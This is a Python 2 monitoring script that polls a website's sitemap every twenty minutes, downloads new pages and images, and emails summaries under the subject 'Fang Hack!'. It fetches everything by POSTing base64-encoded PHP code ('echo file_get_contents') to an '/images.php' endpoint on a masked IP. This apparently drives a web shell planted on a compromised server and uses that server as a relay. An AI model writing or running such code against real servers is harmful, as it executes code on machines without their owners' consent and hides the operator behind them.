import httplib
from xml.dom.minidom import parse
import xml.dom.minidom
import time
import re
import smtplib
from email.mime.text import MIMEText
from email.header import Header

proxy_ip = "xx.xx.xx.xx"
proxy_port = "80"
rq = "echo file_get_contents('{}');"

def getRsp(url):
    headers = {"Content-Type":" application/x-www-form-urlencoded"}
    u = rq.format(url).encode("base64")
    data = "a=34926&code={}".format(u)
    conn = httplib.HTTPConnection(proxy_ip,proxy_port)
    print data
    conn.request(method="POST",url="/images.php",headers=headers,body=data)
    r = conn.getresponse()
    d = r.read()
    print "RSP " + url
    return d

def xml2dict(b):
    re = []
    DOMTree = xml.dom.minidom.parseString(b)
    dom_urls = DOMTree.getElementsByTagName("url")
    for dom_url in dom_urls:
        u = dom_url.getElementsByTagName("loc")[0]
        pu = u.childNodes[0].data
        re.append(pu)
    return re

def task_one():
    new_list = []
    url_list = xml2dict(getRsp("http://www.fangongheike.com/sitemap.xml?page=1"))
    f = open("urls.hack.txt","r")
    us = []
    for line in f.readlines():
        us.append(line.strip())
    f.close()
    for url in url_list:
        if url not in us:
            new_list.append(url)
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    if len(new_list) > 0:
        f = open("urls.hack.txt","w")

        f.write(t + "\n")
        for i in url_list:
            f.write(i + "\n")
        f.close()
        send_message(new_list)
    print t
    print new_list
    
    
def send_message(nlist):
    for u in nlist:
        d = getRsp(u)
        sendmail(getContent(d))
    return True

def getContent(data):
    #print data
    rer = "<meta content='.*' property='og\:"
    ro = re.compile(rer,re.I|re.M)
    s = ro.findall(data)
    #print s
    content = ""
    filename = str(time.time())+".jpg"
    
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    for i in range(0,4):
        s[i]=s[i].replace("<meta content='","").replace("' property='og:","")
    try:
        fimg = open('/root/app/www/fghhhk/'+filename,"w")
        fimg.write(getRsp(s[3]))
        fimg.close()
    except:
        print "img sava fail!"
        filename += "error"
    content = "<html>\n<h3>{}</h3>\n<h2>{}</h2>\n<h3>{}</h3>\n<h3>{}</h3>\n<p><img src='{}'/></p>\n<p><img src='http://106.12.xx.xx/fghhhk/{}'/></p></html>".format(t,s[1],s[0],s[2],s[3],filename)
    return content
    
def sendmail(content):
    mail_host="smtp.163.com"  
    mail_user="f@163.com"   
    mail_pass="f" 
    sender = mail_user
    receivers = ["i@qq.com","w@com.cn"]
    message = MIMEText(content, 'plain')
    message['From'] = Header(mail_user)
    message['To'] =  Header("s")    
    subject = 'Fang Hack!'
    message['Subject'] = Header(subject)   
    try:
        smtpObj = smtplib.SMTP() 
        smtpObj.connect(mail_host, 25)    
        smtpObj.login(mail_user,mail_pass)  
        smtpObj.sendmail(sender, receivers, message.as_string())
        print "send success"
    except smtplib.SMTPException:
        print "Error: err"    
    
    
def run_task():
    while True:
        try:
            task_one()
        except:
            print time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print "error"
        time.sleep(1200)

    
if __name__ == "__main__":
    run_task()


    
    
    
    
    